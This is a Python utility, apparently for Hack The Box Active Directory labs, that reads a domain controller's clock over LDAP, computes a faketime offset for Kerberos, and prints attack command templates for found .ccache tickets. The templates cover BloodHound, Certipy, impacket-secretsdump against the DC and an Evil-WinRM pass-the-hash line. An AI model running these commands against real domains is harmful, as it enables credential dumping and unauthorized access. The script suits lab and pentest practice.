#!/usr/bin/env python3
"""
dc_time_sync.py — Calcula desfase DC, genera offset faketime y sugiere
cómo usar el .ccache con herramientas Kerberos.

Uso:
    python3 dc_time_sync.py <DC_IP>
    python3 dc_time_sync.py <DC_IP> --cmd "impacket-getTGT 'domain/user:pass'"
"""

import sys
import os
import datetime
import argparse

def get_dc_time_ldap(dc_ip: str) -> datetime.datetime:
    try:
        import ldap3
    except ImportError:
        sys.exit("[!] Instala ldap3 primero:  pip install ldap3")

    print(f"[*] Conectando al DC {dc_ip} por LDAP...")
    server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
    conn   = ldap3.Connection(server, auto_bind=True)

    raw = server.info.other.get("currentTime")
    if not raw:
        sys.exit("[!] No se pudo leer currentTime del DC via LDAP.")
    if isinstance(raw, list):
        raw = raw[0]

    dc_time = datetime.datetime.strptime(raw[:14], "%Y%m%d%H%M%S")
    return dc_time.replace(tzinfo=datetime.timezone.utc)


def format_offset(delta_seconds: int) -> str:
    sign  = "+" if delta_seconds >= 0 else "-"
    abs_s = abs(delta_seconds)
    hours   = abs_s // 3600
    minutes = (abs_s % 3600) // 60
    seconds = abs_s % 60
    if hours > 0 and minutes == 0 and seconds == 0:
        return f"{sign}{hours}h"
    elif hours > 0:
        return f"{sign}{hours}h{minutes}m{seconds}s" if seconds else f"{sign}{hours}h{minutes}m"
    elif minutes > 0:
        return f"{sign}{minutes}m{seconds}s" if seconds else f"{sign}{minutes}m"
    else:
        return f"{sign}{seconds}s"


def find_ccache_files() -> list:
    """Busca archivos .ccache en el directorio actual."""
    return [f for f in os.listdir('.') if f.endswith('.ccache')]


def suggest_ccache_usage(ccache_files: list, offset: str, dc_ip: str, domain: str):
    """Sugiere cómo usar los .ccache encontrados con herramientas comunes."""
    print("=" * 60)
    print("[*] .ccache encontrados en el directorio actual:")
    print()
    for ccache in ccache_files:
        # Inferir usuario del nombre del archivo
        user = ccache.replace('.ccache', '')
        print(f"  Ticket : {ccache}  (usuario: {user})")
        print()
        print(f"  # BloodHound")
        print(f"  KRB5CCNAME={ccache} faketime -f \"{offset}\" bloodhound-python \\")
        print(f"    -u {user} -k -no-pass -d {domain} \\")
        print(f"    -ns {dc_ip} -dc dc01.{domain} --zip -c All")
        print()
        print(f"  # Certipy — enumerar templates ADCS")
        print(f"  KRB5CCNAME={ccache} faketime -f \"{offset}\" certipy-ad find \\")
        print(f"    -u {user}@{domain} -k -no-pass \\")
        print(f"    -target dc01.{domain} -dc-ip {dc_ip} -stdout -enabled")
        print()
        print(f"  # Evil-WinRM (Pass-the-Hash, no necesita ccache)")
        print(f"  # evil-winrm -i {dc_ip} -u '{user}' -H '<NT_HASH>'")
        print()
        print(f"  # impacket genérico (secretsdump, psexec, etc.)")
        print(f"  KRB5CCNAME={ccache} faketime -f \"{offset}\" impacket-secretsdump \\")
        print(f"    -k -no-pass {user}@dc01.{domain}")
        print("-" * 60)


def main():
    parser = argparse.ArgumentParser(description="Calcula desfase DC y genera prefijo faketime")
    parser.add_argument("dc_ip", help="IP del Domain Controller")
    parser.add_argument("--domain", default="", help="Dominio (ej: logging.htb). Si no se pone, se intenta inferir.")
    parser.add_argument("--cmd", default="", help="Comando a envolver con faketime (opcional)")
    args = parser.parse_args()

    local_utc = datetime.datetime.now(datetime.timezone.utc)
    dc_utc    = get_dc_time_ldap(args.dc_ip)

    delta_s   = int((dc_utc - local_utc).total_seconds())
    rounded_s = round(delta_s / 3600) * 3600
    offset    = format_offset(rounded_s)

    # Inferir dominio del hostname del DC si no se pasó
    domain = args.domain or "domain.htb"

    print()
    print(f"  Hora local  (UTC) : {local_utc.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Hora DC     (UTC) : {dc_utc.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Diferencia exacta : {delta_s:+d} seg  ({format_offset(delta_s)})")
    print(f"  Offset redondeado : {rounded_s:+d} seg  →  {offset}  ✓ Kerberos safe")
    print()

    if args.cmd:
        full_cmd = f'faketime -f "{offset}" {args.cmd}'
        print(f"[+] Comando listo:\n\n    {full_cmd}\n")
    else:
        print(f"[+] Prefijo faketime para tus comandos Kerberos:")
        print(f'\n    faketime -f "{offset}" <tu_comando>\n')
        print("    # Sacar TGT:")
        print(f'    faketime -f "{offset}" impacket-getTGT \'{domain}/USUARIO:PASS\' -dc-ip {args.dc_ip}')
        print()

    # Buscar .ccache y sugerir uso
    ccache_files = find_ccache_files()
    if ccache_files:
        print()
        suggest_ccache_usage(ccache_files, offset, args.dc_ip, domain)
    else:
        print("[*] No se encontraron archivos .ccache en el directorio actual.")
        print("    Saca un ticket primero y vuelve a correr el script para ver sugerencias.")


if __name__ == "__main__":
    main()
